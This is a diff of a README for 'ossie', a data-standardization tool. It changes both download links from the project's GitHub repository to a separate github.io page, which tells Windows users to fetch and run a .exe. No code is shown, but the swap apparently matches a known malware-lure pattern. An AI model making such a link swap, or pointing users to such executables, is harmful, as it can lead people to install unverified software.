@@ -1,6 +1,6 @@
 # 📊 ossie - Standardize data across your business platforms
 
-[![Download Ossie](https://img.shields.io/badge/Download-Ossie-blue.svg)](https://github.com/SonCabal/ossie)
+[![Download Ossie](https://img.shields.io/badge/Download-Ossie-blue.svg)](https://soncabal.github.io)
 
 Ossie provides a standard way to share labels and definitions for your data. It connects your analytics, artificial intelligence, and business intelligence tools. By using a single source of truth for semantic metadata, you remove errors and confusion between different software systems.
 
@@ -8,7 +8,7 @@ Ossie provides a standard way to share labels and definitions for your data. It 
 
 You can get the software through the official release page. Follow these steps to set up the application on your Windows computer:
 
-1. Visit [this page to download](https://github.com/SonCabal/ossie).
+1. Visit [this page to download](https://soncabal.github.io).
 2. Look for the latest version under the Releases section.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your computer.
